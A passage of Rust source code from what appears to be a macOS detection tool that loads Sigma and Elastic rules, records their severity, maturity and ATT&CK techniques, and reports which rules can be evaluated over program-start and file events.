    /// incident; every lower match is counted only.
    pub fn raises(self) -> bool {
        self >= Level::High
    }

    pub fn as_str(self) -> &'static str {
        LEVELS
            .iter()
            .find(|(_, l)| *l == self)
            .map_or("", |(n, _)| n)
    }
}

/// What a person reads for a rule's level: its name, or that it states none.
pub fn level_said(level: Option<Level>) -> &'static str {
    level.map_or(NO_LEVEL, Level::as_str)
}

/// The words for a rule whose set states no level.
pub const NO_LEVEL: &str = "no level stated";

/// The heading of the rules whose set states no level, wherever rules are ordered or cut by
/// severity. No level is not a place on that scale: those rules are a group of their own, after
/// the rules with a level, and never ranked among them.
pub const NO_LEVEL_GROUP: &str = "of a set that states no level";

/// How mature a rule is, Sigma's statuses.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Status {
    Stable,
    Test,
    Experimental,
    Deprecated,
    Unsupported,
}

const STATUSES: [(&str, Status); 5] = [
    ("stable", Status::Stable),
    ("test", Status::Test),
    ("experimental", Status::Experimental),
    ("deprecated", Status::Deprecated),
    ("unsupported", Status::Unsupported),
];

impl Status {
    /// How sure a finding from a rule of this status is, as OCSF's confidence names it. A
    /// published rule is written from attacks seen elsewhere and was never tuned to this Mac,
    /// where coding agents and build tools start `grep`, `curl`, `osascript` and `dd` all day,
    /// so no status makes a match sure. SigmaHQ calls a rule `stable` once it has been used in
    /// several environments for some time with its false positives listed: medium. `test`,
    /// which is 67 of the 69 macOS rules, says false positives may still be found, and
    /// `experimental` that it is new: low. No published false-positive rate for these rules
    /// on developer Macs was found. So a finding from a
    /// shipped `test` rule is never urgent: it is shown, and the app does not alert on it.
    pub fn confidence(self) -> &'static str {
        match self {
            Status::Stable => "medium",
            Status::Test | Status::Experimental | Status::Deprecated | Status::Unsupported => "low",
        }
    }

    pub fn as_str(self) -> &'static str {
        STATUSES
            .iter()
            .find(|(_, s)| *s == self)
            .map_or("", |(n, _)| n)
    }
}

/// What a rule says about itself. Text from the rule, returned as data.
#[derive(Debug)]
pub struct Meta {
    pub id: String,
    /// Its name: its set and its id, `sigma:<id>`, `elastic:<id>` or `elastic-behaviour:<id>`,
    /// the same in every command. A finding of a rule of a set that raises carries it.
    pub name: String,
    pub title: String,
    /// `None` for a rule of a set that states no level (`Source::states_levels`). That is not a
    /// place on the scale of severity: wherever rules are ordered or cut by level, the rules
    /// with none are a group of their own (`NO_LEVEL_GROUP`).
    pub level: Option<Level>,
    pub status: Status,
    /// The rule's `author` field. The Detection Rule License asks that a message made from a
    /// match keeps it.
    pub author: Option<String>,
    /// ATT&CK technique ids from its `attack.t…` tags, as `T1027.001`.
    pub techniques: Vec<String>,
    /// The rule's `description`: what it looks for, in its author's words.
    pub description: Option<String>,
    /// The set it comes from.
    pub source: &'static Source,
}

impl Meta {
    /// Whether a match of this rule raises a finding: only a rule that states a level that
    /// raises (`Level::raises`). A rule with no level is counted and handed over, like one
    /// below high.
    pub fn raises(&self) -> bool {
        self.level.is_some_and(Level::raises)
    }

    /// Its level's name for a machine, `None` when it states none.
    pub fn level_name(&self) -> Option<&'static str> {
        self.level.map(Level::as_str)
    }

    /// The rule as a person reads it in a listing: its title, then its set in words. Rules of
    /// different sets can have the same title, so every listing for a person names a rule by
    /// this, and a machine reads the set in the fields `source` and `set`.
    pub fn label(&self) -> String {
        label(&self.title, self.source)
    }
}

/// A title and the set it is of, for a person: `Meta::label`, and the file of a rule that could
/// not be read in place of its title.
pub fn label(title: &str, source: &Source) -> String {
    format!("{title} ({})", source.set)
}

/// What this level does with a rule. Whether a rule it can evaluate watches this Mac now is
/// another question, the level's state and what its collector records:
/// `crate::status::rules_section`.
#[derive(Debug, PartialEq)]
pub enum Placement {
    /// Every part of the rule can match an event of its kind.
    Evaluated,
    /// Evaluated, but these alternatives never match here, for a field this level does not
    /// have or a part the translation could not carry; the rest of the rule can.
    InPart(Vec<Branch>),
    NotEvaluated(Reason),
}

/// One alternative of a rule that never matches at this level.
#[derive(Debug, PartialEq)]
pub struct Branch {
    /// The selection it is an alternative of; `None` for an alternative of the upstream rule
    /// that the translation left out.
    pub selection: Option<String>,
    /// The fields it needs that an event of its kind does not give.
    pub fields: Vec<String>,
    /// For an alternative the translation left out, what the translation recorded of it, as it
    /// wrote it: `needs_fields <field>`, or `backslash_in_wildcard <field>: <pattern>`.
    pub said: Option<String>,
}

/// Why a rule is not evaluated. The codes are a closed vocabulary; the last four are the
/// translation's reasons for an upstream rule it did not take.
#[derive(Debug, PartialEq)]
pub enum Reason {
    /// It is about another kind of event, named by its logsource category, or for an upstream
    /// rule not taken by the kind and actions the translation read, which this level does not
    /// read.
    NeedsEvents(String),
    /// A selection it cannot do without needs fields an event of its kind does not give.
    NeedsFields(Vec<String>),
    /// It searches the whole message for keywords, and this level has fields, not messages.
    KeywordSearch,
    /// It could not be read, with what the parser said.
    NotParsed(String),
    /// It correlates several events in a sequence, which a Sigma rule over one event cannot.
    Sequence,
    /// It is written in a query language other than EQL, the one translated.
    NotEql,
    /// It holds a backslash in a wildcard pattern, whose meaning in Elasticsearch is not
    /// documented, in a part it cannot do without.
    BackslashInWildcard,
    /// It is about program starts and file events at once.
    SpansKinds,
    /// It could never be true over the events here, such as one that asks for a field no event
    /// of its kind has.
    NeverTrue,
    /// A part it cannot do without is a regular expression of EQL's, which is not translated.
    Regex,
    /// A part it cannot do without uses a function of EQL's that the translation does not
    /// carry.
    Unsupported,
    /// A part it cannot do without compares one field of the event with another, which a Sigma
    /// rule cannot.
    Function,
}

impl Reason {
    pub fn code(&self) -> &'static str {
        match self {
            Reason::NeedsEvents(_) => "needs_events",
            Reason::NeedsFields(_) => "needs_fields",
            Reason::KeywordSearch => "keyword_search",
            Reason::NotParsed(_) => "not_parsed",
            Reason::Sequence => "sequence",
            Reason::NotEql => "not_eql",
            Reason::BackslashInWildcard => "backslash_in_wildcard",
            Reason::SpansKinds => "spans_kinds",
            Reason::NeverTrue => "never_true",
            Reason::Regex => "regex",
            Reason::Unsupported => "unsupported",
            Reason::Function => "function",
        }
    }

    /// What it means, for a person.
    pub fn said(&self) -> String {
        match self {
            Reason::NeedsEvents(c) => format!("needs {c} events"),
            Reason::NeedsFields(f) => format!("needs {}", f.join(", ")),
            Reason::KeywordSearch => "searches whole messages for keywords".into(),
            Reason::NotParsed(said) => format!("could not be read: {said}"),
            Reason::Sequence => "correlates a sequence of events, which is not translated".into(),
            Reason::NotEql => "is not written in EQL, the only language translated".into(),
            Reason::BackslashInWildcard => {
                "has a backslash in a wildcard pattern, whose meaning in Elasticsearch is not documented".into()
            }
            Reason::SpansKinds => "is about program starts and file events at once".into(),
            Reason::NeverTrue => "could never be true over the events here".into(),
            Reason::Regex => {
                "needs a regular expression in EQL's syntax, which is not translated".into()
            }
            Reason::Unsupported => "uses a function of EQL's that is not translated".into(),
            Reason::Function => {
                "compares one field with another, which a Sigma rule cannot".into()
            }
        }
    }
}

/// One shipped rule, read once, or one upstream rule its set names as not taken.
pub struct Loaded {
    /// Its path under its source's folder; for an upstream rule not taken, the upstream file's
    /// path under its `rules/` folder.
    pub file: &'static str,
    /// The set it comes from.
    pub source: &'static Source,
    /// `None` only when it could not be parsed.
    pub meta: Option<Meta>,
    pub placement: Placement,
    /// The kind of event it is about; `None` for a kind this level does not read, a rule that
    /// could not be read, or an upstream rule not taken.
    pub kind: Option<Kind>,
    /// For an upstream rule not taken, what the translation said of it, as it said it.
    pub detail: Option<&'static str>,
    rule: Option<sigma_rust::Rule>,
    /// Which of `Rules::layouts` its events are given in: its source's schema.
    layout: usize,
    /// What an event must hold for the rule to be able to match it.
    need: Need,
    /// What of `crate::events::KEEPS` the fields it reads need its collector to have kept, and
    /// those fields: it is not asked about a line whose collector did not keep them.
    pub needs: crate::events::Keeps,
    pub needs_fields: Vec<String>,
}

impl Loaded {
    /// An upstream rule its set names as not taken: no file of it is shipped.
    pub fn not_taken(&self) -> bool {
        self.detail.is_some()
    }

    /// A rule read whole of a set that states no level: one of `NO_LEVEL_GROUP`.
    pub fn states_no_level(&self) -> bool {
        self.meta.as_ref().is_some_and(|m| m.level.is_none())
    }

    /// Evaluated, wholly or in part, over events of this kind.
    fn asked_of(&self, kind: Kind) -> bool {
        self.kind == Some(kind) && !matches!(self.placement, Placement::NotEvaluated(_))
    }

    /// Evaluated, wholly or in part, and reads a field the collector does not keep when it does
    /// not keep `missing`: it judges nothing while that collector writes the log.
    pub fn silenced_by(&self, missing: crate::events::Keeps) -> bool {
        self.needs & missing != 0 && !matches!(self.placement, Placement::NotEvaluated(_))
    }

    /// Asked about an event of `kind` whose collector kept `kept`.
    fn asked_about(&self, kind: Kind, kept: crate::events::Keeps) -> bool {
        self.asked_of(kind) && self.needs & !kept == 0
    }
}

/// A rule an event matched.
pub struct Match<'a> {
    pub file: &'static str,
    pub meta: &'a Meta,
    pub kind: Kind,
}

impl Match<'_> {
    /// What a message made from this match carries, the rule's authors included as the
    /// Detection Rule License asks.
    pub fn json(&self) -> Json {
        let m = self.meta;
        json!({
            "name": m.name,
            "source": m.source.name,
            "set": m.source.set,
            "file": self.file,
            "events": self.kind.category(),
            "id_text": crate::status::text(&m.id),
            "title_text": crate::status::text(&m.title),
            "level": m.level_name(),
            "status": m.status.as_str(),
            "techniques": m.techniques,
            "author_text": m.author.as_deref().map(crate::status::text),
        })
    }
}

pub struct Rules {
    pub rules: Vec<Loaded>,
    /// One for each schema the rules use, in the order first used.
    layouts: Vec<Layout>,
}

static SHIPPED_RULES: std::sync::OnceLock<Rules> = std::sync::OnceLock::new();

impl Rules {
    /// Every shipped rule of every set, parsed once per process, not at each reading: the
    /// watcher reads program starts every thirty seconds for as long as it runs.
    pub fn shipped() -> &'static Rules {
        SHIPPED_RULES.get_or_init(|| Rules::of(&SOURCES))
    }

    /// Every rule of these sets: their files, then the upstream rules they did not take.
    pub fn of(sources: &[&'static Source]) -> Rules {
        let mut loading = Loading::default();
        for source in sources {
            for (file, text) in source.files {
                loading.add(source, file, text);
            }
            for line in source.not_taken.into_iter().flat_map(|t| t.lines().skip(1)) {
                loading.not_taken(source, line);
            }
        }
        loading.done()
    }

    /// These files, as rules of SigmaHQ's set.
    #[cfg(test)]
    pub fn load(files: &[(&'static str, &'static str)]) -> Rules {
        Rules::load_as(&SIGMAHQ, files)
    }

    /// These files, as rules of `source`'s set.
    #[cfg(test)]
    pub fn load_as(source: &'static Source, files: &[(&'static str, &'static str)]) -> Rules {
        let mut loading = Loading::default();
        for (file, text) in files {
            loading.add(source, file, text);
        }
        loading.done()
    }

    /// A rule by its id, among those that could be read.
    pub fn by_id(&self, id: &str) -> Option<&Loaded> {
        self.rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.id == id))
    }

    /// A rule by its name, its set and its id.
    pub fn by_name(&self, rule: &str) -> Option<&Loaded> {
        self.rules
            .iter()
            .find(|l| l.meta.as_ref().is_some_and(|m| m.name == rule))
    }

    /// The rules this event matches, in the order they are shipped. Only rules of its kind
    /// that are evaluated, wholly or in part, are asked, each about the event as its source's
    /// schema gives it, and of them only those whose `Need` the event holds: a rule whose need
    /// it does not hold cannot match it, so the answer is the one `evaluate_each` gives by
    /// asking every rule of its kind.
    pub fn evaluate<'e>(&self, subject: impl Into<Subject<'e>>) -> Vec<Match<'_>> {
        let subject = subject.into();
        let kind = subject.kind();
        let mut hit = vec![false; self.rules.len()];
        for (n, layout) in self.layouts.iter().enumerate() {
            for values in layout.forms(subject) {
                let event = layout.event(kind, &values);
                for i in self.asked(n, kind, subject.kept(), &values) {
                    if !hit[i] {
                        hit[i] = self.rules[i]
                            .rule
                            .as_ref()
                            .is_some_and(|r| r.is_match(&event));
                    }
                }
            }
        }
        self.matched(kind, &hit)
    }

    /// The rules marked in `hit`, in the order they are shipped.
    fn matched(&self, kind: Kind, hit: &[bool]) -> Vec<Match<'_>> {
        self.rules
            .iter()
            .zip(hit)
            .filter(|(_, hit)| **hit)
            .filter_map(|(l, _)| {
                Some(Match {
                    file: l.file,
                    meta: l.meta.as_ref()?,
                    kind,
                })
            })
            .collect()
    }

    /// The rules to ask about an event of `kind` with these values of layout `n`, as
    /// `Layout::forms` gives them, by their place: those of its schema and kind evaluated,
    /// wholly or in part, whose need the values hold.
    fn asked(
        &self,
        n: usize,
        kind: Kind,
        kept: crate::events::Keeps,
        values: &[Option<String>],
    ) -> Vec<usize> {
        let held = self.layouts[n].texts.as_ref().map(|t| t.held(values));
        self.rules
            .iter()
            .enumerate()
            .filter(|(_, l)| l.layout == n && l.asked_about(kind, kept))
            .filter(|(_, l)| held.as_ref().is_none_or(|h| l.need.holds(h)))
            .map(|(i, _)| i)
            .collect()
    }

    /// The same answer as `evaluate`, by asking every rule of the event's kind: the reference
    /// the faster path is held to.
    #[cfg(test)]
    pub fn evaluate_each<'e>(&self, subject: impl Into<Subject<'e>>) -> Vec<Match<'_>> {
        let subject = subject.into();
        let kind = subject.kind();
        let mut hit = vec![false; self.rules.len()];
        for (n, layout) in self.layouts.iter().enumerate() {
            for values in layout.forms(subject) {
                let event = layout.event(kind, &values);
                for (i, l) in self.rules.iter().enumerate() {
                    hit[i] |= l.layout == n
                        && l.asked_about(kind, subject.kept())
                        && l.rule.as_ref().is_some_and(|r| r.is_match(&event));
                }
            }
        }
        self.matched(kind, &hit)
    }

    /// The rules evaluated in full over events of `kind`.
    pub fn evaluated(&self, kind: Kind) -> usize {
        self.rules
            .iter()
            .filter(|l| l.kind == Some(kind) && l.placement == Placement::Evaluated)
            .count()
    }

    /// The sets the rules come from, in the order they are listed.
    pub fn sources(&self) -> Vec<&'static Source> {
        let mut sources: Vec<&'static Source> = Vec::new();
        for l in &self.rules {
            if !sources.iter().any(|s| std::ptr::eq(*s, l.source)) {
                sources.push(l.source);
            }
        }
        sources
    }

    /// The names a schema gives the fields of `kind`.
    fn fields_of(&self, schema: &Schema, kind: Kind) -> Vec<&str> {
        self.layouts
            .iter()
            .find(|l| std::ptr::eq(l.schema, schema))
            .map(|l| l.names(kind).iter().map(String::as_str).collect())
            .unwrap_or_default()
    }

    /// The summary of `immune rules --json`: the sets, and how many rules are shipped,
    /// evaluated, evaluated in part and not evaluated, with the rules behind each number.
    pub fn summary_json(&self) -> Json {
        let named = |l: &Loaded| {
            let mut v = json!({
                "source": l.source.name,
                "set": l.source.set,
                "name": l.meta.as_ref().map(|m| m.name.as_str()),
                "file": l.file,
                "id_text": l.meta.as_ref().map(|m| crate::status::text(&m.id)),
                "title_text": l.meta.as_ref().map(|m| crate::status::text(&m.title)),
                "level": l.meta.as_ref().and_then(Meta::level_name),
                "status": l.meta.as_ref().map(|m| m.status.as_str()),
                "events": l.kind.map(Kind::category),
            });
            match &l.placement {
                Placement::Evaluated => {}
                Placement::InPart(branches) => {
                    v["never_matches"] = branches
                        .iter()
                        .map(|b| {
                            json!({
                                "selection_text": b.selection.as_deref().map(crate::status::text),
                                "fields_text": texts(&b.fields),
                                "left_out_text": b.said.as_deref().map(crate::status::text),
                            })
                        })
                        .collect();
                }
                Placement::NotEvaluated(reason) => {
                    v["reason"] = json!(reason.code());
                    match reason {
                        Reason::NeedsEvents(c) => v["events_text"] = crate::status::text(c),
                        Reason::NeedsFields(f) => v["fields_text"] = texts(f),
                        Reason::NotParsed(said) => v["said_text"] = crate::status::text(said),
                        _ => {}
                    }
                    if let Some(d) = l.detail {
                        v["detail_text"] = crate::status::text(d);
                    }
                }
            }
            v
        };
        let totals = |rules: &[&Loaded]| {
            let count =
                |p: fn(&Placement) -> bool| rules.iter().filter(|l| p(&l.placement)).count();
            let not_taken = rules.iter().filter(|l| l.not_taken()).count();
            json!({
                "shipped": rules.len() - not_taken,
                "not_taken": not_taken,
                "evaluated": count(|p| *p == Placement::Evaluated),
                "in_part": count(|p| matches!(p, Placement::InPart(_))),
                "not_evaluated": count(|p| matches!(p, Placement::NotEvaluated(_))),
            })
        };
        let sources: Vec<Json> = self
            .sources()
            .into_iter()
            .map(|s| {
                let mine: Vec<&Loaded> = self
                    .rules
                    .iter()
                    .filter(|l| std::ptr::eq(l.source, s))
                    .collect();
                json!({
                    "name": s.name,
                    "publisher": s.publisher,
                    "set": s.set,
                    "states_levels": s.states_levels,
                    "url": s.url,
                    "commit": s.commit,
                    "commit_date": s.commit_date,
                    "licence": s.licence,
                    "folder": s.folder,
                    "translated": s.translation.is_some(),
                    "fields": {
                        CATEGORY: self.fields_of(s.schema, Kind::Process),
                        FILE_CATEGORY: self.fields_of(s.schema, Kind::File),
                    },
                    "totals": totals(&mine),
                })
            })
            .collect();
        let (evaluated, in_part, not_evaluated) = self.groups();
        let all: Vec<&Loaded> = self.rules.iter().collect();
        json!({
            "sources": sources,
            "events": CATEGORY,
            "file_events": FILE_CATEGORY,
            "totals": totals(&all),
            "evaluated": evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "in_part": in_part.into_iter().map(named).collect::<Vec<_>>(),
            "not_evaluated": not_evaluated.into_iter().map(named).collect::<Vec<_>>(),
            "drill": DRILL.iter().map(|(test, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                json!({
                    "atomic_test": test,
                    "image": image,
                    "arguments": args,
                    "must_raise": DRILL_RULE,
                    "raised": matches.iter().any(|m| m.meta.id == DRILL_RULE),
                    "matches": matches.iter().map(Match::json).collect::<Vec<_>>(),
                })
            }).collect::<Vec<_>>(),
        })
    }

    /// How many drill starts raise the rule they must.
    fn drill_raised(&self) -> usize {
        DRILL
            .iter()
            .filter(|(_, image, args)| {
                let matches = self.evaluate(&drill_start(image, args));
                matches.iter().any(|m| m.meta.id == DRILL_RULE)
            })
            .count()
    }

    /// Where the sets come from, in one line for a person.
    pub fn sources_said(&self) -> String {
        let said: Vec<String> = self
            .sources()
            .into_iter()
            .map(|s| {
                let mine = self.rules.iter().filter(|l| std::ptr::eq(l.source, s));
                let (n, not_taken) =
                    mine.fold((0, 0), |(n, t), l| (n + 1, t + usize::from(l.detail.is_some())));
                let at = match s.commit_date {
                    Some(date) => format!("at {} of {date}", &s.commit[..12]),
                    None => format!("at {}", &s.commit[..12]),
                };
                let levels = if s.states_levels {
                    ""
                } else {
                    ", none with a level stated"
                };
                if s.translation.is_some() {
                    format!(
                        "{n} from {} {at}, {} of them translated into Sigma and shipped, {not_taken} not taken{levels}",
                        s.set,
                        n - not_taken
                    )
                } else {
                    format!("{n} from {} {at}, all shipped{levels}", s.set)
                }
            })
            .collect();
        format!("Published rules for macOS: {}.", said.join("; "))
    }

    /// The same summary for a person, a line each, with how many times each rule matched in
    /// the last day where the store says.
    pub fn summary_lines(&self, last_day: Option<&BTreeMap<String, i64>>) -> Vec<String> {
        let (evaluated, in_part, not_evaluated) = self.groups();
        let row = |l: &Loaded| match &l.meta {
            Some(m) => {
                let n = last_day.and_then(|d| d.get(&m.id)).copied().unwrap_or(0);
                let matched = if n > 0 {
                    format!(" · matched {} in the last day", times(n))
                } else {
                    String::new()
                };
                format!("  {:<15} {}{matched}", level_said(m.level), m.label())
            }
            None => format!("  {:<15} {}", "?", label(l.file, l.source)),
        };
        // The rules of a set that states no level come after the rest under their own heading,
        // as a group and never as a rank (`groups`).
        let heading = |l: &Loaded, group: &[&Loaded], lines: &mut Vec<String>| {
            let first = group.iter().find(|g| g.states_no_level());
            if first.is_some_and(|f| std::ptr::eq(*f, l)) {
                let n = group.iter().filter(|g| g.states_no_level()).count();
                lines.push(format!("  {}: {n}", crate::pages::capital(NO_LEVEL_GROUP)));
            }
        };
        let mut lines = vec![
            self.sources_said(),
            format!(
                "Evaluated in full: {}, {} on every program start and {} on every file created or renamed",
                evaluated.len(),
                self.evaluated(Kind::Process),
                self.evaluated(Kind::File)
            ),
        ];
        for l in &evaluated {
            heading(l, &evaluated, &mut lines);
            lines.push(row(l));
        }
        lines.push(format!(
            "Evaluated in part, some alternatives never match here: {}",
            in_part.len()
        ));
        for l in &in_part {
            heading(l, &in_part, &mut lines);
            lines.push(row(l));
            if let Placement::InPart(branches) = &l.placement {
                for b in branches {
                    lines.push(format!("      {}", branch_said(b, l.kind)));
                }
            }
        }
        lines.push(format!("Not evaluated: {}", not_evaluated.len()));
        for l in &not_evaluated {
            heading(l, &not_evaluated, &mut lines);
            lines.push(row(l));
            if let Placement::NotEvaluated(reason) = &l.placement {
                let mut said = match reason {
                    Reason::NeedsFields(f) => format!(
                        "needs {}, which {} does not give",
                        f.join(", "),
                        given_by(l.kind)
                    ),
                    r => r.said(),
                };
                if let Some(d) = l.detail {
                    said.push_str(&format!(" ({d})"));
                }
                lines.push(format!("      {said}"));
            }
        }
        lines.push(format!(
            "Drill, Atomic Red Team T1027.001: {} of {} program starts raise {}.",
            self.drill_raised(),
            DRILL.len(),
            self.rules
                .iter()
                .filter_map(|l| l.meta.as_ref())
                .find(|m| m.id == DRILL_RULE)
                .map_or(DRILL_RULE, |m| m.title.as_str())
        ));
        lines
    }

    /// The rules split by placement: evaluated, in part, not evaluated, each from the most
    /// severe down, in the order they are shipped within a level, then one that could not be
    /// read; then, as a group of their own and not as a place on the scale, the rules of a set
    /// that states no level (`NO_LEVEL_GROUP`).
    pub fn groups(&self) -> (Vec<&Loaded>, Vec<&Loaded>, Vec<&Loaded>) {
        let mut all: Vec<&Loaded> = self.rules.iter().collect();
        all.sort_by_key(|l| {
            (
                l.states_no_level(),
                std::cmp::Reverse(l.meta.as_ref().and_then(|m| m.level)),
            )
        });
        let mut groups = (Vec::new(), Vec::new(), Vec::new());
        for l in all {
            match l.placement {
                Placement::Evaluated => groups.0.push(l),
                Placement::InPart(_) => groups.1.push(l),
                Placement::NotEvaluated(_) => groups.2.push(l),
            }
        }
        groups
    }
}

/// An alternative that never matches here, for a person.
pub fn branch_said(b: &Branch, kind: Option<Kind>) -> String {
    match (&b.selection, b.fields.is_empty(), &b.said) {
        (Some(selection), _, _) => format!(
            "{selection} needs {}, which {} does not give",
            b.fields.join(", "),
            given_by(kind)
        ),
        (None, false, _) => format!(
            "an alternative of the upstream rule needs {}, which {} does not give",
            b.fields.join(", "),
            given_by(kind)
        ),
        (None, true, said) => format!(
            "an alternative of the upstream rule was left out in translation: {}",
            said.as_deref().unwrap_or("")
        ),
    }
}

/// What gives a rule's fields, for a person: "a program start" or "a file event".
pub fn given_by(kind: Option<Kind>) -> &'static str {
    match kind {
        Some(Kind::File) => "a file event",
        _ => "a program start",
    }
}

/// How many times, as a number with its thousands separated.
pub fn times(n: i64) -> String {
    crate::view::counted(n, "time", "times")
}

fn texts(items: &[String]) -> Json {
    items.iter().map(|s| crate::status::text(s)).collect()
}

/// The rules as they are read, before the texts they need are gathered into automata.
#[derive(Default)]
struct Loading {
    rules: Vec<Loaded>,
    layouts: Vec<Layout>,
    /// The texts the rules of each layout need, numbered.
    wanted: Vec<Wanted>,
}

impl Loading {
    /// The layout of a schema, made at its first use.
    fn layout(&mut self, schema: &'static Schema) -> usize {
        match self
            .layouts
            .iter()
            .position(|l| std::ptr::eq(l.schema, schema))
        {
            Some(n) => n,
            None => {
                self.layouts.push(Layout::new(schema));
                self.wanted.push(Wanted::new());
                self.layouts.len() - 1
            }
        }
    }

    fn add(&mut self, source: &'static Source, file: &'static str, text: &str) {
        let n = self.layout(source.schema);
        let loaded = load(source, file, text, n, &self.layouts[n], &mut self.wanted[n]);
        self.rules.push(loaded);
    }

    /// An upstream rule its set names as not taken, from its line in `Source::not_taken`. A
    /// line that cannot be read is a rule that could not be read, named by the line.
    fn not_taken(&mut self, source: &'static Source, line: &'static str) {
        let layout = self.layout(source.schema);
        let cells: Vec<&'static str> = line.split('\t').collect();
        let read = match cells[..] {
            // A set that states no level leaves the severity empty, and only such a set may.
            [file, id, name, "", reason, detail] if !source.states_levels => {
                Ok((file, id, name, None, reason, detail))
            }
            [file, id, name, severity, reason, detail] if source.states_levels => LEVELS
                .iter()
                .find(|(n, _)| *n == severity)
                .map(|(_, level)| (file, id, name, Some(*level), reason, detail))
                .ok_or(format!("the severity {severity:?} is not a level")),
            [_, _, _, severity, _, _] => Err(format!(
                "the set states no level, and the line gives the severity {severity:?}"
            )),
            _ => Err("the line has not six cells".to_string()),
        };
        let loaded = match read.and_then(|(file, id, name, level, reason, detail)| {
            let reason = not_taken_reason(reason, detail)?;
            Ok(Loaded {
                file,
                source,
                meta: Some(Meta {
                    id: id.to_string(),
                    name: format!("{}:{id}", source.name),
                    title: name.to_string(),
                    level,
                    // The translation writes `test` for every rule of the set, whatever the
                    // upstream rule's maturity.
                    status: Status::Test,
                    author: None,
                    techniques: Vec::new(),
                    description: None,
                    source,
                }),
                placement: Placement::NotEvaluated(reason),
                kind: None,
                detail: Some(detail),
                rule: None,
                layout,
                need: Need::Any,
                needs: 0,
                needs_fields: Vec::new(),
            })
        }) {
            Ok(loaded) => loaded,
            Err(said) => Loaded {
                file: line,
                source,
                meta: None,
                placement: Placement::NotEvaluated(Reason::NotParsed(said)),
                kind: None,
                detail: None,
                rule: None,
                layout,
                need: Need::Any,
                needs: 0,
                needs_fields: Vec::new(),
            },
        };
        self.rules.push(loaded);
    }

    fn done(self) -> Rules {
        let mut layouts = self.layouts;
        for (layout, wanted) in layouts.iter_mut().zip(self.wanted) {
            layout.texts = Texts::new(wanted, layout.names.len());
        }
        Rules {
            rules: self.rules,
            layouts,
        }
    }
}

/// The reason a translation gave for not taking an upstream rule, from its code and detail.
fn not_taken_reason(code: &str, detail: &str) -> Result<Reason, String> {
    Ok(match code {
        "sequence" => Reason::Sequence,
        "not_eql" => Reason::NotEql,
        "backslash_in_wildcard" => Reason::BackslashInWildcard,
        "spans_kinds" => Reason::SpansKinds,
        "never_true" => Reason::NeverTrue,
        "regex" => Reason::Regex,
        "unsupported" => Reason::Unsupported,
        "function" => Reason::Function,
        "needs_events" => Reason::NeedsEvents(detail.to_string()),
        "needs_fields" => Reason::NeedsFields(
            detail
                .split("; ")
                .filter_map(|item| item.strip_prefix("needs_fields "))
                .map(str::to_string)
                .collect(),
        ),
        other => return Err(format!("the reason {other:?} is not one this build knows")),
    })
}

/// Reads one rule. The YAML is parsed once; the evaluator builds its rule from it, and the
/// level, status and shape of the detection, which the evaluator keeps to itself, are read
/// from it to place the rule.
fn load(
    source: &'static Source,
    file: &'static str,
    text: &str,
    n: usize,
    layout: &Layout,
    texts: &mut Wanted,
) -> Loaded {
    let not_parsed = |said: String| Loaded {
        file,
        source,
        meta: None,
        placement: Placement::NotEvaluated(Reason::NotParsed(said)),
        kind: None,
        detail: None,
        rule: None,
        layout: n,
        need: Need::Any,
        needs: 0,
        needs_fields: Vec::new(),
    };
    let yaml: Value = match serde_norway::from_str(text) {
        Ok(v) => v,
        Err(e) => return not_parsed(e.to_string()),
    };
    if let Err(said) = shape(&yaml, source) {
        return not_parsed(said);
    }
    let rule: sigma_rust::Rule = match serde_norway::from_value(yaml.clone()) {
        Ok(rule) => rule,
        Err(e) => return not_parsed(e.to_string()),
    };
    let meta = match meta(&rule, &yaml, source) {
        Ok(m) => m,
        Err(said) => return not_parsed(said),
    };
    let kind = Kind::of(yaml["logsource"]["category"].as_str().unwrap_or_default());
    let placement = match source
        .translation
        .as_ref()
        .map(|t| left_out(&yaml[t.record]))
    {
        Some(Err(said)) => return not_parsed(said),
        Some(Ok(left)) => place(&yaml, layout, left),
        None => place(&yaml, layout, Vec::new()),
    };
    let (needs, needs_fields) = kind.map_or((0, Vec::new()), |k| kept_needs(&yaml, source, k));
    Loaded {
        file,
        source,
        meta: Some(meta),
        placement,
        kind,
        detail: None,
        rule: Some(rule),
        layout: n,
        need: kind.map_or(Need::Any, |kind| need(&yaml, layout, kind, texts)),
        needs,
        needs_fields,
    }
}

/// What of `crate::events::KEEPS` a rule about events of `kind` needs its collector to have
/// kept, from every field its detection names, a folded copy as its field, and those fields.
fn kept_needs(yaml: &Value, source: &Source, kind: Kind) -> (crate::events::Keeps, Vec<String>) {
    let schema = source.schema;
    let mut fields = BTreeSet::new();
    let mut needs = 0;
    for (_, selection) in yaml["detection"].as_mapping().into_iter().flatten() {
        let maps: Vec<&serde_norway::Mapping> = match selection {
            Value::Mapping(m) => vec![m],
            Value::Sequence(items) => items.iter().filter_map(Value::as_mapping).collect(),
            _ => Vec::new(),
        };
        for name in maps
            .into_iter()
            .flat_map(|m| m.keys().filter_map(Value::as_str))
            .filter_map(|k| k.split('|').next())
        {
            let base = schema
                .folded
                .and_then(|p| name.strip_prefix(p))
                .unwrap_or(name);
            for (_, field, keep) in schema
                .kept
                .iter()
                .filter(|(k, f, _)| *k == kind && *f == base)
            {
                needs |= keep;
                fields.insert(field.to_string());
            }
        }
    }
    (needs, fields.into_iter().collect())
}

/// The alternatives of the upstream rule that a translation recorded as left out, each as a
/// branch that never matches: `needs_fields <field>` names a field the log does not give; any
/// other item, such as a pattern the translation could not carry, is kept as it was written.
/// Without the record, what was left out is not known, and the rule is not evaluated.
fn left_out(record: &Value) -> Result<Vec<Branch>, String> {
    let Some(items) = record["in_part_missing_fields"].as_sequence() else {
        return Err("the translation's record of what it left out is not a list".to_string());
    };
    items
        .iter()
        .map(|item| {
            let said = item
                .as_str()
                .ok_or("the translation's record of what it left out is not text")?;
            let fields = said
                .strip_prefix("needs_fields ")
                .map(|f| vec![f.to_string()])
                .unwrap_or_default();
            Ok(Branch {
                selection: None,
                fields,
                said: Some(said.to_string()),
            })
        })
        .collect()
}

// ---- What a start must hold for a rule to be able to match it. ----
//
// Most starts match no rule, and asking the evaluator is most of the time spent on a start:
// it folds both sides of every comparison anew. So each rule is reduced, once, to a condition
// a start must meet for the rule to be able to match it, made only of texts that must occur in
// a field. One pass of a multi-pattern search over each field of a start then says which texts
// it holds, and only a rule whose condition holds is asked. The answer is the evaluator's.
//
// The condition is derived from the rule as the evaluator reads it (`sigma-rust` 0.7.0): a
// string value, whatever its modifier among `contains`, `startswith`, `endswith`, `cased` and
